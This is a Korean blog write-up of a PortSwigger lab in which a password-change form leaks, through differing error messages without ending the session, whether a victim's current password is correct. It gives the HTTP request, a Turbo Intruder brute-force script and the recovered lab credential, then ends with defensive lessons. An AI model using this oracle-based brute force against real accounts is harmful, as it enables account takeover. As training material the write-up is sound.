+++
date = '2026-07-10T18:00:00+09:00'
draft = false
title = '[Write-up] PortSwigger - Password brute-force via password change'
summary = "비밀번호 변경 폼이 새 비밀번호 불일치 시엔 세션을 유지하면서 현재 비밀번호 정오에 따라 응답을 달리하는 점을 이용해, 변경 기능을 오라클 삼아 브루트포스하는 Authentication 풀이"
toc = true
tags = ["Authentication", "Brute Force", "Password Change", "PortSwigger", "Practitioner"]
+++

---

## 문제 분석

> **난이도**: `PRACTITIONER`  
> **Lab**: [Password brute-force via password change](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change)

> ![image.png](/writeup/portswigger/authentication/12/1.png)

이 랩은 비밀번호 변경 기능에 브루트포스 취약점이 있다. 비밀번호 후보 목록으로 `carlos`의 계정 페이지에 접근하면 문제가 해결된다. 실습 계정은 `wiener:peter`, 피해자 계정은 `carlos`이며 [password 후보](https://portswigger.net/web-security/authentication/auth-lab-passwords)가 주어진다.

### Authentication 진단

먼저 본인 계정으로 비밀번호 변경 기능을 사용해 요청을 확인한다.

```http
POST /my-account/change-password HTTP/2
Host: <lab-id>.web-security-academy.net
Cookie: session=<session>
Content-Type: application/x-www-form-urlencoded

username=wiener&current-password=peter&new-password-1=peter&new-password-2=peter
```

본문에 `username`이 실려 있어 대상 계정을 지정할 수 있고, 변경 로직의 응답이 입력 조합에 따라 어떻게 갈리는지 관찰한다.

- **현재 비밀번호가 틀림** → 곧바로 세션이 폐기된다.
- **새 비밀번호 두 값이 불일치**(`new-password-1` ≠ `new-password-2`) → `New passwords do not match` 응답, 세션은 **유지**된다.
- **현재 비밀번호 틀림 + 새 비밀번호 불일치** → `Current password is incorrect` 응답.

여기서 결정적인 조합은 마지막 두 가지다. 새 비밀번호를 일부러 서로 다르게 보내면 실제 변경은 일어나지 않으면서, **현재 비밀번호의 정오에 따라 응답이 갈린다.**

- 현재 비밀번호가 맞음 + 새 비밀번호 불일치 → `New passwords do not match`
- 현재 비밀번호가 틀림 + 새 비밀번호 불일치 → `Current password is incorrect`

즉 변경 기능이 "현재 비밀번호가 맞는가"를 알려 주는 오라클이 되며, 세션도 폐기되지 않아 반복 시도가 가능하다.

---

## 익스플로잇

대상을 `carlos`로 지정하고 `new-password-1`·`new-password-2`를 일부러 다르게 고정한 채, `current-password`에 후보를 대입한다. Turbo Intruder 스크립트는 다음과 같다.

```python
import hashlib
import base64

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=3,
                           requestsPerConnection=50,
                           pipeline=False
                           )

    for word in open(r'C:/Users/cas/Desktop/CAS/asset/word.txt'):
        engine.queue(target.req, word.rstrip())

def handleResponse(req, interesting):
    table.add(req)
```

`current-password` 위치에 후보를 주입한다. 대부분은 `Current password is incorrect`를 반환하지만, `george`에서만 `New passwords do not match`가 돌아온다 — 현재 비밀번호가 맞았다는 뜻이다.

![image.png](/writeup/portswigger/authentication/12/2.png)

확인한 `carlos:george`로 로그인하면 문제가 해결된다.

![image.png](/writeup/portswigger/authentication/12/3.png)

---

## 정리

이 랩의 결함은 브루트포스가 로그인이 아니라 **비밀번호 변경 기능**에서 일어난다는 점이다. 로그인 폼에는 rate limit이 걸려 있을지 몰라도, 변경 폼은 그 방어 밖에 있는 경우가 많다. 게다가 이 변경 로직은 두 개의 실패 조건(현재 비밀번호 오류, 새 비밀번호 불일치)을 서로 다른 메시지로 답하고, 그중 "새 비밀번호 불일치"일 때는 세션을 폐기하지 않는다. 이 조합이 "현재 비밀번호 정오"를 무한히 물어볼 수 있는 오라클을 만든다.

핵심은 두 가지다. 첫째, **인증 관련 검증은 그 결과를 세밀한 메시지로 흘리지 않아야** 한다. 어떤 입력이 틀렸는지 구분해 알려 주면 그 구분이 곧 오라클이 된다. 둘째, **브루트포스 방어는 로그인뿐 아니라 비밀번호를 검증하는 모든 경로**(변경·재설정·재인증)에 동일하게 적용되어야 한다. 한 곳이라도 검증을 응답으로 노출하고 시도 제한이 없으면, 공격자는 방어가 없는 그 문으로 들어온다.

부수적으로 이 랩은 변경 요청이 본문의 `username`으로 대상을 지정한다는 점에서 [password reset broken logic](/write-up/portswigger/authentication/write-up-portswigger---password-reset-broken-logic/)과도 닿아 있다. 진단에서는 인증값을 다루는 보조 기능을 로그인만큼 꼼꼼히 보고, 실패 응답의 분기와 세션 유지 여부를 함께 확인한다.
